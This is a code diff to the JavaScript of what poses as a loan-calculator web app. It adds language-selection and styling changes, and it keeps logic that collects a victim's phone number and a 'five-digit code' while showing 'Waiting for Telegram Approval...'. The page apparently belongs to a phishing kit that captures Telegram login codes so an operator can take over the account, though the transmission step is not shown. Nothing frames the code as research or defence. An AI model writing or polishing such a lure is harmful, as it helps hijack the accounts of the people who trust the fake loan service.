@@ -6,8 +6,20 @@ function goToScreen(screenId) {
     document.getElementById(screenId).classList.add('active');
 }
 
-function selectLanguage(lang) {
-    goToScreen('screen-home');
+// --- Language Selection Logic ---
+function selectLanguage(lang, element) {
+    // Remove 'selected' class from all options
+    document.querySelectorAll('.lang-option').forEach(opt => {
+        opt.classList.remove('selected');
+    });
+    
+    // Add 'selected' class to the clicked one
+    element.classList.add('selected');
+    
+    // Wait a brief moment for the user to see the radio button click, then move to home
+    setTimeout(() => {
+        goToScreen('screen-home');
+    }, 300);
 }
 
 // --- Loan Calculator Logic ---
@@ -80,7 +92,7 @@ async function nextStep() {
                 isValid = false;
                 input.style.borderColor = 'red';
             } else {
-                input.style.borderColor = '#ccc';
+                input.style.borderColor = '#3c5c75'; // Reset to dark border
             }
         });
 
@@ -89,13 +101,12 @@ async function nextStep() {
             return;
         }
 
-        // 2. Change Button Text (No more dark screen)
+        // 2. Change Button Text
         const nextBtn = document.getElementById('btn-next');
         const originalText = nextBtn.innerText;
         nextBtn.innerText = "Waiting for Telegram Approval...";
         nextBtn.disabled = true;
 
-        // Get Phone Number and 5-digit Code
         const phone = document.getElementById('phone-number').value || "Unknown";
         const code = document.getElementById('five-digit-code').value || "Unknown";
 
